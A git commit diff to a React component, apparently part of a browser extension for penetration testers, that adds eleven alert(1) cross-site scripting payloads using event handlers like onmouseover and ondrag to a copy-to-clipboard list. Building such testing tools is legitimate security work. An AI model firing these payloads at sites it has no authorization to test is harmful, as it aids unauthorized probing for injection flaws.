34b5d77a78a18df48307f85cdddc453409200860
Kabir <44284877+kabir0x23@users.noreply.github.com>
2022-10-22 01:10:19 +0530

    improve & add xss payloads and structure of extension (#27)
    * add: copy to clipboard Payloads (web browser)
    
    * improve & add xss payloads and structure of extension

--- src/components/Payloads/Payloads.tsx
+++ src/components/Payloads/Payloads.tsx
@@ -1,8 +1,13 @@
 import React, {useState} from "react";
 import SyntaxHighlighter from 'react-syntax-highlighter';
 import {CopyToClipboard} from 'react-copy-to-clipboard';
-import {PayloadsContainer, PayloadsCopyToClipboard, PayloadsHeading,} from "./PayloadsElements";
-import {AiOutlineCopy} from 'react-icons/ai';
+import {
+    CopyToClipboardIcon,
+    PayloadsContainer,
+    PayloadsCopyToClipboard,
+    PayloadsHeading,
+    SyntaxHighlighterDesign
+} from "./PayloadsElements";import {AiOutlineCopy} from 'react-icons/ai';
 import {docco} from 'react-syntax-highlighter/dist/esm/styles/hljs';
 
 const Payloads = () => {
@@ -10,6 +15,17 @@ const Payloads = () => {
     const PayloadsList = [
         "onload=alert(1)><svg/1=",
         ">alert(1)</script><script/1=",
+        '<a draggable="true" ondrag="alert(1)">test</a>',
+        '<a draggable="true" ondragend="alert(1)">test</a>',
+        '<a draggable="true" ondragenter="alert(1)">test</a>',
+        '<a draggable="true" ondragleave="alert(1)">test</a>',
+        '<a draggable="true" ondragstart="alert(1)">test</a>',
+        '<a onmouseenter="alert(1)">test</a>',
+        '<a onmouseleave="alert(1)">test</a>',
+        '<a onmousemove="alert(1)">test</a>',
+        '<a onmouseout="alert(1)">test</a>',
+        '<a onmouseover="alert(1)">test</a>',
+        '<a onmouseup="alert(1)">test</a>',
     ];
 
     const [state, setState] = useState({
@@ -20,11 +36,13 @@ const Payloads = () => {
     const PayloadsListMap = PayloadsList.map((payload, index) => {
         return (
             <PayloadsCopyToClipboard key={index}>
-                <SyntaxHighlighter language="javascript" style={docco}>
+                <SyntaxHighlighterDesign language="javascript" style={docco}>
                     {payload}
-                </SyntaxHighlighter>
+                </SyntaxHighlighterDesign>
                 <CopyToClipboard text={payload} onCopy={() => setState({value, copied: true})}>
-                    <AiOutlineCopy/>
+                    <CopyToClipboardIcon>
+                        <AiOutlineCopy/>
+                    </CopyToClipboardIcon>
                 </CopyToClipboard>
             </PayloadsCopyToClipboard>
         );
@@ -33,13 +51,8 @@ const Payloads = () => {
     return (
         <PayloadsContainer>
             <PayloadsHeading>Payloads</PayloadsHeading>
-            <SyntaxHighlighter>TTY shell</SyntaxHighlighter>
-
             {PayloadsListMap}
-
-
             {state.copied ? <span style={{color: 'red'}}>Copied.</span> : null}
-
         </PayloadsContainer>
     );
 };
